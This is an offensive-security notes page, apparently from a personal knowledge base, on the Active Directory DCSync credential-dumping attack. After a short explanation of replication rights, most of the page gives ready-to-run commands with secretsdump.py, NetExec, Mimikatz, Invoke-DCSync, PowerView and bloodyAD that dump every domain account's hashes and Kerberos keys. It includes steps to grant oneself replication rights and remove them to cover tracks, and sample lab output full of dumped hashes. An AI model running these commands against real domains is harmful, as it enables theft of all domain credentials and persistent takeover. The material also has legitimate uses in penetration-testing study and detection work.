---
created: 2026-08-05
updated: 2026-10-16
tags:
  - AD
  - AD_attacks
---
>[!note] [`T1003.006 — OS Credential Dumping: DCSync — MITRE ATT&CK`](https://attack.mitre.org/techniques/T1003/006/).

>[!abstract] **Scope**: dumping password hashes, Kerberos keys, and other secrets for arbitrary domain accounts using the DCSync attack (abusing an account that holds AD replication rights).

## DCSync

### AD replication and MS-DRSR

- Active Directory **replication** is the process of synchronizing directory data across Domain Controllers (DCs).
- Replication is performed using an RPC protocol called **[MS-DRSR](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-drsr/f977faaa-673e-4f66-b9bf-48c640241d47) (Directory Replication Service Remote Protocol)**. It operates on a **multimaster** model where any writable DC can accept changes.

>[!interesting]- Why replication is needed
>- Active Directory is a distributed directory service; every Domain Controller maintains its own copy of the `NTDS.dit` database.
>- Any writable DC can introduce changes to the database (for example, new users, password changes, group membership updates). 
>- To maintain consistency across the domain (as well as redundancy and therefore fault tolerance), these changes must eventually be propagated to every other DC. 
>- The replication process is what synchronizes data between domain controllers. For example, it ensures that authentication remains consistent regardless of which DC serves a client, and that individual DC failures don't lead to permanent data loss.

- Directory replication synchronizes all AD data, including sensitive attributes such as user password hashes, password history, and Kerberos long-term keys.
- A DC pulls changes from another DC by calling the DRSUAPI method [`IDL_DRSGetNCChanges`](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-drsr/b63730ac-614c-431c-9501-28d6aca91894) (`DsGetNCChanges`).

### Replication rights and the DCSync attack

- To replicate data, a security principal needs the following extended rights, granted on the **domain naming context** (the domain root, e.g. `DC=example,DC=local`):

| Access right                                                                                                                                          | GUID                                   | Description                                                                                                                                     |
| ----------------------------------------------------------------------------------------------------------------------------------------------------- | -------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------- |
| [`DS-Replication-Get-Changes`](https://learn.microsoft.com/en-us/windows/win32/adschema/r-ds-replication-get-changes)                                 | `1131f6aa-9c07-11d1-f79f-00c04fc2dcd2` | Replicate public and non-confidential attributes; by itself it excludes password hashes.                                                        |
| [`DS-Replication-Get-Changes-All`](https://learn.microsoft.com/en-us/windows/win32/adschema/r-ds-replication-get-changes-all)                         | `1131f6ad-9c07-11d1-f79f-00c04fc2dcd2` | Replicate all attributes, including secrets such as password hashes and Kerberos keys.                                                          |
| [`DS-Replication-Get-Changes-In-Filtered-Set`](https://learn.microsoft.com/en-us/windows/win32/adschema/r-ds-replication-get-changes-in-filtered-set) | `89e95b76-444d-4c62-991a-0facbeda640c` | Replicate attributes in the Read-Only Domain Controller (RODC) Filtered Attribute Set (FAS), such as the legacy LAPS attribute `ms-Mcs-AdmPwd`. |

>If you control an account that has [`DS-Replication-Get-Changes`](https://learn.microsoft.com/en-us/windows/win32/adschema/r-ds-replication-get-changes) and [`DS-Replication-Get-Changes-All`](https://learn.microsoft.com/en-us/windows/win32/adschema/r-ds-replication-get-changes-all) extended rights, you can request any data from a DC, including password hashes, just as it's done by a DC during normal replication process. This is called the **DCSync attack**.

>[!important] DCSync requires **both** rights: `DS-Replication-Get-Changes` to request the replication and `DS-Replication-Get-Changes-All` to receive the secret attributes.

>[!info] The `DS-Replication-Get-Changes-In-Filtered-Set` extended right is generally not needed for DCSync.

- Although replication is intended to be performed only by Domain Controllers (using the computer accounts of the DCs), MS-DRSR allows any account with the necessary privileges to pull the data.
- From the Domain Controller's perspective, the request resembles a legitimate replication operation. If the requester holds the required replication permissions, the server authorizes the request and returns the replicated attributes.

>[!note] The attack doesn't require code execution on the DC, just network connectivity to the DC and an account with the necessary extended rights.

>[!note]+ Accounts that hold the replication rights by default:
> - `Domain Controllers`
> - `Enterprise Domain Controllers`
> - `Domain Admins`
> - `Enterprise Admins`
> - `Administrators` (implicitly via DACL / ownership)

>[!tip]+
>- AD allows the replication rights to be delegated, so an administrator may explicitly grant them to, for example, backup accounts, identity synchronization services, or `Microsoft Entra Connect`.

>[!warning] DCSync is easy to detect: a replication request (DRSUAPI `DsGetNCChanges`) from a host that isn't a Domain Controller is anomalous.

## Executing the DCSync attack

>[!tip]+
> - The easiest way spot possibilities for the DCSync attack is by searching for `DCSync` edges in BloodHound:
> 
> ```cypher
> MATCH p=(n)-[:DCSync|GetChanges|GetChangesAll]->(:Domain) RETURN p
> ```
> ![[DCSync_bloodhound.png]]


- After the attack, depending on the extracted secret:
	- **NT hash** -> authenticate with [[Pass-the-Hash]], or crack offline (hashcat mode `1000`).
	- **`krbtgt` hash** -> forge a [[Golden Ticket]] for domain-wide persistence.
	- **Kerberos keys (AES/RC4)** -> [[Overpass-the-Hash]] to request TGTs.
	- **Service or computer account hash** -> forge a [[Silver Ticket]] for the services that account runs.
### From Linux

#### Checking extended access rights

- To check if the controlled principal has the required extended access rights, you can inspect their DACL using the Impacket's [`dacledit.py`](https://github.com/fortra/impacket/blob/master/examples/dacledit.py) (look for the two replication GUIDs):

```bash
dacledit.py -action read -principal jdoe -target-dn 'DC=example,DC=com' -dc-ip 10.129.75.222 'example.com'/'jdoe':'passwd123'
```
#### `secretsdump.py`

- To perform a DCSync attack, you can use the Impacket's [`secretsdump.py`](https://github.com/fortra/impacket/blob/master/examples/secretsdump.py) script:

```bash
secretsdump.py -just-dc 'example.com'/'jdoe':'passwd123'@dc01.example.com
```

>[!note]+ Option breakdown 
> | Option          | Description                                                                                  |
> | --------------- | -------------------------------------------------------------------------------------------- |
> | `-outputfile`   | Write results to files with the given prefix (`.ntds`, `.ntds.kerberos`, `.ntds.cleartext`). |
> | `-just-dc`      | Request NTLM hashes and Kerberos keys using AD replication (perform the DCSync attack). |
> | `-just-dc-ntlm` | Extract only NTLM hashes.                                                                    |
> | `-just-dc-user` | Extract credentials only for a specific (DRSUAPI method).                                    |
> | `-pwd-last-set` | Include the date each account's password was last set.                                       |
> | `-history`      | Include password history hashes.                                                             |
> | `-user-status`  | Show whether each account is disabled.                                                       |
> | `-hashes`       | Authenticate using [[Pass-the-Hash]] (format: `LM_hash:NT_hash`).                            |
> | `-k`            | Authenticate using Kerberos (`.ccache`).                                                     |
> | `-aesKey`       | Authenticate using an AES key (Pass-the-Key).                                                               |

- Authenticate using [[Pass-the-Hash]]:

```bash
secretsdump.py -just-dc -hashes :3dc553ce4b9fd20bd016e098d2d2fd2e 'example.com'/'jdoe'@dc01.example.com
```

- Authenticate using Kerberos ticket (`.ccache`):

```bash
export KRB5CCNAME=jdoe.ccache
secretsdump.py -just-dc -k -no-pass 'example.com'/'jdoe'@dc01.example.com
```

- Authenticate using an AES-128/AES-256 key (Pass-the-Key):

```bash
secretsdump.py -just-dc -aesKey 9d453509ca9b7bec02ea8c2161d2d340fd94bf30cc7e52cb94853a04e9e69664 'example.com'/'jdoe'@dc01.example.com
```

>[!tip]+
>- If the DC host can't be resolved from hostname, specify its IP address using `-dc-ip`.

>[!example]-
> ```bash
> impacket-secretsdump -outputfile hashes.txt -just-dc ADMINISTRATOR.HTB/ethan@10.129.75.222
> ```
> 
> ```bash
>  Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 
> Password:
> [*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
> [*] Using the DRSUAPI method to get NTDS.DIT secrets
> Administrator:500:aad3b435b51404eeaad3b435b51404ee:3dc553ce4b9fd20bd016e098d2d2fd2e:::
> Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
> krbtgt:502:aad3b435b51404eeaad3b435b51404ee:1181ba47d45fa2c76385a82409cbfaf6:::
> administrator.htb\olivia:1108:aad3b435b51404eeaad3b435b51404ee:fbaa3e2294376dc0f5aeb6b41ffa52b7:::
> administrator.htb\michael:1109:aad3b435b51404eeaad3b435b51404ee:d503a8571a79baf9b951884f350ad048:::
> administrator.htb\ethan:1113:aad3b435b51404eeaad3b435b51404ee:5c2b9f97e0620c3d307de85a93179884:::
> DC$:1000:aad3b435b51404eeaad3b435b51404ee:cf411ddad4807b5b4a275d31caa1d4b3:::
> [*] Kerberos keys grabbed
> Administrator:aes256-cts-hmac-sha1-96:9d453509ca9b7bec02ea8c2161d2d340fd94bf30cc7e52cb94853a04e9e69664
> Administrator:aes128-cts-hmac-sha1-96:08b0633a8dd5f1d6cbea29014caea5a2
> Administrator:des-cbc-md5:403286f7cdf18385
> krbtgt:aes256-cts-hmac-sha1-96:920ce354811a517c703a217ddca0175411d4a3c0880c359b2fdc1a494fb13648
> krbtgt:aes128-cts-hmac-sha1-96:aadb89e07c87bcaf9c540940fab4af94
> krbtgt:des-cbc-md5:2c0bc7d0250dbfc7
> > administrator.htb\olivia:aes256-cts-hmac-sha1-96:713f215fa5cc408ee5ba000e178f9d8ac220d68d294b077cb03aecc5f4c4e4f3
> administrator.htb\olivia:aes128-cts-hmac-sha1-96:3d15ec169119d785a0ca2997f5d2aa48
> administrator.htb\olivia:des-cbc-md5:bc2a4a7929c198e9
> administrator.htb\michael:aes256-cts-hmac-sha1-96:f64b481150ac2147bb95306741963dae37af893de4d1eab1c86d27b215d30666
> administrator.htb\michael:aes128-cts-hmac-sha1-96:c5451ed530d620c64ccda558a0e1a84a
> administrator.htb\michael:des-cbc-md5:19e0ad856ef2915e
> administrator.htb\benjamin:aes256-cts-hmac-sha1-96:aa6e8a30fae4f5518f705f18d534b81466eacbd1870819af5f4affce1914df58
> administrator.htb\benjamin:aes128-cts-hmac-sha1-96:7ebc1816a063e1e2f90d9f13c5195232
> administrator.htb\benjamin:des-cbc-md5:fb0d86704c851c04
> administrator.htb\emily:aes256-cts-hmac-sha1-96:53063129cd0e59d79b83025fbb4cf89b975a961f996c26cdedc8c6991e92b7c4
> administrator.htb\emily:aes128-cts-hmac-sha1-96:fb2a594e5ff3a289fac7a27bbb328218
> administrator.htb\emily:des-cbc-md5:804343fb6e0dbc51
> administrator.htb\ethan:aes256-cts-hmac-sha1-96:e8577755add681a799a8f9fbcddecc4c3a3296329512bdae2454b6641bd3270f
> administrator.htb\ethan:aes128-cts-hmac-sha1-96:e67d5744a884d8b137040d9ec3c6b49f
> administrator.htb\ethan:des-cbc-md5:58387aef9d6754fb
> administrator.htb\alexander:aes256-cts-hmac-sha1-96:b78d0aa466f36903311913f9caa7ef9cff55a2d9f450325b2fb390fbebdb50b6
> administrator.htb\alexander:aes128-cts-hmac-sha1-96:ac291386e48626f32ecfb87871cdeade
> administrator.htb\alexander:des-cbc-md5:49ba9dcb6d07d0bf
> administrator.htb\emma:aes256-cts-hmac-sha1-96:951a211a757b8ea8f566e5f3a7b42122727d014cb13777c7784a7d605a89ff82
> administrator.htb\emma:aes128-cts-hmac-sha1-96:aa24ed627234fb9c520240ceef84cd5e
> administrator.htb\emma:des-cbc-md5:3249fba89813ef5d
> DC$:aes256-cts-hmac-sha1-96:98ef91c128122134296e67e713b233697cd313ae864b1f26ac1b8bc4ec1b4ccb
> DC$:aes128-cts-hmac-sha1-96:7068a4761df2f6c760ad9018c8bd206d
> DC$:des-cbc-md5:f483547c4325492a
> [*] Cleaning up... 
> ```

- Target only a specific account rather than the whole directory (`-just-dc-user` implies `-just-dc`):

```bash
secretsdump.py -just-dc-user krbtgt 'example.com'/'jdoe':'passwd123'@dc01.example.com
```

```bash
secretsdump.py -just-dc-user administrator 'example.com'/'jdoe':'passwd123'@dc01.example.com
```

- Dump NT hashes only, with password history, last-set dates, and account status:

```bash
secretsdump.py -just-dc-ntlm -history -pwd-last-set -user-status 'example.com'/'jdoe':'passwd123'@dc01.example.com
```

- When `-outputfile` prefix is specified, `secretsdump.py` writes output to the following files:

| File              | Content                                                        |
| ----------------- | -------------------------------------------------------------- |
| `.ntds`           | NTDS domain account LM and NT hashes.                          |
| `.ntds.kerberos`  | Kerberos keys (DES, AES-128, AES-256).                         |
| `.ntds.cleartext` | Cleartext passwords recovered from reversible encryption.      |
| `.sam`            | Local SAM hashes (full dump only, not produced by `-just-dc`). |
| `.secrets`        | LSA secrets (full dump only).                                  |
| `.cached`         | Cached domain logon hashes / DCC2 (full dump only).            |
#### NetExec

- You can also use `NetExec`'s `--ntds` to perform the DCSync attack (`--ntds` uses `drsuapi` by default):

```bash
nxc smb dc01.example.com -u jdoe -p 'passwd123' --ntds
```

```bash
nxc smb dc01.example.com -u administrator -H '3dc553ce4b9fd20bd016e098d2d2fd2e' --ntds
```

>[!note] See [`Dump NTDS.dit — NetExec Wiki`](https://www.netexec.wiki/smb-protocol/obtaining-credentials/dump-ntds.dit).

>[!note] See [[🛠️ NetExec & CrackMapExec]].

### From Windows

#### Checking extended access rights

- Confirm your controlled accounts holds replication rights on the domain root using [`PowerView`](https://powersploit.readthedocs.io/en/latest/Recon/):

```powershell
$sid = Convert-NameToSid jdoe
```

```powershell
Get-DomainObjectAcl "DC=example,DC=com" -ResolveGUIDs | ? {$_.ObjectAceType -match 'Replication-Get'} | ? {$_.SecurityIdentifier -match $sid} | select AceQualifier, ObjectDN, ActiveDirectoryRights, SecurityIdentifier, ObjectAceType | fl
```

>[!example]-
> ```powershell
> Get-DomainObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDs | ? {$_.ObjectAceType -match 'Replication-Get'} | ? {$_.SecurityIdentifier -match $sid} | select AceQualifier, ObjectDN, ActiveDirectoryRights, SecurityIdentifier, ObjectAceType | fl
> ```
> 
> ```powershell
> AceQualifier          : AccessAllowed
> ObjectDN              : DC=INLANEFREIGHT,DC=LOCAL
> ActiveDirectoryRights : ExtendedRight
> SecurityIdentifier    : S-1-5-21-3842939050-3880317879-2865463114-1164
> ObjectAceType         : DS-Replication-Get-Changes-In-Filtered-Set
> 
> AceQualifier          : AccessAllowed
> ObjectDN              : DC=INLANEFREIGHT,DC=LOCAL
> ActiveDirectoryRights : ExtendedRight
> SecurityIdentifier    : S-1-5-21-3842939050-3880317879-2865463114-1164
> ObjectAceType         : DS-Replication-Get-Changes
> 
> AceQualifier          : AccessAllowed
> ObjectDN              : DC=INLANEFREIGHT,DC=LOCAL
> ActiveDirectoryRights : ExtendedRight
> SecurityIdentifier    : S-1-5-21-3842939050-3880317879-2865463114-1164
> ObjectAceType         : DS-Replication-Get-Changes-All
> ```

- Alternatively, check the domain root's DACL using the native [`dsacls`](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc771151(v=ws.11)):

```powershell
dsacls "DC=example,DC=com" | findstr /c:"Replicating Directory Changes"
```

#### Mimikatz

- From Windows, use Mimikatz's [`lsadump::dcsync`](https://tools.thehacker.recipes/mimikatz/modules/lsadump/dcsync) module.

>[!important]+ Mimikatz must run in the context of the account that holds the DCSync rights.
>- To spawn a process as another account, you can use `runas /netonly`:
>```powershell
>runas /netonly /user:EXAMPLE\jdoe cmd.exe
>```

- Replicate a single account:

```powershell
mimikatz.exe "lsadump::dcsync /domain:EXAMPLE.LOCAL /user:EXAMPLE\administrator" exit
```

>[!note]+ Option breakdown 
> | Option          | Description                                           |
> | --------------- | ----------------------------------------------------- |
> | `/domain`       | Target domain (FQDN).                                 |
> | `/user`         | Replicate a single account (SAM name, UPN, or SID).   |
> | `/all`          | Replicate the entire directory database.              |
> | `/guid`         | Target an account by its object GUID instead of name. |
> | `/dc` or `/kdc` | Specify which Domain Controller to pull from.         |
> | `/csv`          | Output in CSV format.                                 |
> | `/export`       | Save the results to files.                            |

>[!example]-
> ```powershell
> mimikatz # lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator
> [DC] 'INLANEFREIGHT.LOCAL' will be the domain
> [DC] 'ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL' will be the DC server
> [DC] 'INLANEFREIGHT\administrator' will be the user account
> [rpc] Service  : ldap
> [rpc] AuthnSvc : GSS_NEGOTIATE (9)
> 
> Object RDN           : Administrator
> 
> ** SAM ACCOUNT **
> SAM Username         : administrator
> Account Type         : 30000000 ( USER_OBJECT )
> User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
> Object Security ID   : S-1-5-21-3842939050-3880317879-2865463114-500
> 
> Credentials:
>   Hash NTLM: 88ad09182de639ccc6579eb0849751cf
> # <SNIP>
> ```

- Target `krbtgt` to later forge a [[Golden Ticket]]:

```powershell
lsadump::dcsync /domain:EXAMPLE.LOCAL /user:EXAMPLE\krbtgt
```

- Replicate the entire directory and output results to CSV:

```powershell
lsadump::dcsync /domain:EXAMPLE.LOCAL /all /csv
```
#### `Invoke-DCSync` (PowerShell)

- To avoid dropping Mimikatz to disk, you can use [`Invoke-DCSync`](https://gist.github.com/monoxgas/9d238accd969550136db) (from PowerShell), which loads a Mimikatz DLL into memory. By default, it enumerates all domain users and prints their NT hashes:

```powershell
Invoke-DCSync -PWDumpFormat
```

- Replicate only the specified account:

```powershell
Invoke-DCSync -DumpForest -Users @("krbtgt") | ft -wrap -autosize
```

> [!note]- Option breakdown
> | Option          | Description                                                  |
> | --------------- | ------------------------------------------------------------ |
> | `-Users`        | Replicate only the specified accounts (e.g., `@("krbtgt")`). |
> | `-PWDumpFormat` | Format output as `user:id:lm:ntlm:::`.                       |
> | `-DumpForest`   | Run the target options against all domains in the forest.    |

## Granting replication rights

- If you don't hold the replication rights but control an account with `WriteDacl` or `WriteOwner` on the domain root, you can grant these rights to a controlled account, run the attack, then remove them later to cover the tracks.

- Grant DCSync rights using PowerView (Windows):

```powershell
Add-DomainObjectAcl -TargetIdentity "DC=example,DC=com" -PrincipalIdentity jdoe -Rights DCSync
```

- Using `bloodyAD` (Linux):

```bash
bloodyAD --host dc01.example.com -d example.com -u jdoe -p 'passwd123' add dcsync jdoe
```

>[!tip] See [[AD ACL attacks#WriteDACL]] and [[AD ACL attacks#DCSync rights]].

## References and further reading

- [`Active Directory Replication Concepts — Microsoft Learn`](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/get-started/replication/active-directory-replication-concepts)
- [`[MS-DRSR]: Directory Replication Service (DRS) Remote Protocol — Microsoft Learn`](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-drsr/f977faaa-673e-4f66-b9bf-48c640241d47)
- [`Control Access Rights — Microsoft Learn`](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/1522b774-6464-41a3-87a5-1e5633c3fbbb)
- [`Store passwords using reversible encryption — Microsoft Learn`](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/store-passwords-using-reversible-encryption)
- [`DCSync — The Hacker Recipes`](https://www.thehacker.recipes/ad/movement/credentials/dumping/dcsync)
- [`DCSync — HackTricks`](https://hacktricks.wiki/windows-hardening/active-directory-methodology/dcsync.html)
- [`lsadump::dcsync — The Hacker Tools`](https://tools.thehacker.recipes/mimikatz/modules/lsadump/dcsync)
- [`Invoke-DCSync — NetSPI`](https://www.netspi.com/blog/technical-blog/web-application-pentesting/invoke-dcsync-because-we-all-wanted-it)
- [`Dump NTDS.dit — NetExec Wiki`](https://www.netexec.wiki/smb-protocol/obtaining-credentials/dump-ntds.dit)
- [`OS Credential Dumping: DCSync — MITRE ATT&CK`](https://attack.mitre.org/techniques/T1003/006/)

 - [`Dump NTDS.dit — NetExec Wiki`](https://www.netexec.wiki/smb-protocol/obtaining-credentials/dump-ntds.dit)

## Appendix A: Reversible encryption (cleartext passwords) 

- Active Directory normally stores password **hashes** (NT hashes, Kerberos keys derived from the password, and password history as hashes), not just plaintext passwords, so this is what DCSync extracts.
- However, if [`Store passwords using reversible encryption`](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/store-passwords-using-reversible-encryption) is enabled for an account, **AD additionally stores the user's password encrypted with RC4**. Microsoft describes this as *roughly equivalent to storing the password in plaintext*. 
- `secretsdump.py` writes any such passwords to the `.ntds.cleartext` file, and Mimikatz prints them alongside the hash.

---

- Enumerate accounts with reversible encryption set (`userAccountControl` bit `128` = `ENCRYPTED_TEXT_PWD_ALLOWED`) using the `ActiveDirectory` module:

```powershell
Get-ADUser -Filter 'userAccountControl -band 128' -Properties userAccountControl
```

>[!example]-
> ```powershell
> PS C:\Tools> Get-ADUser -Filter 'userAccountControl -band 128' -Properties userAccountControl
> ```
> 
> ```powershell
> DistinguishedName  : CN=PROXYAGENT,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
> Enabled            : True
> Name               : PROXYAGENT
> ObjectClass        : user
> SamAccountName     : proxyagent
> SID                : S-1-5-21-3842939050-3880317879-2865463114-5222
> userAccountControl : 640
> ```

- Enumerate using PowerView:

```powershell
Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} | select samaccountname,useraccountcontrol
```

```powershell
Get-DomainUser -UACFilter ENCRYPTED_TEXT_PASSWORD_ALLOWED
```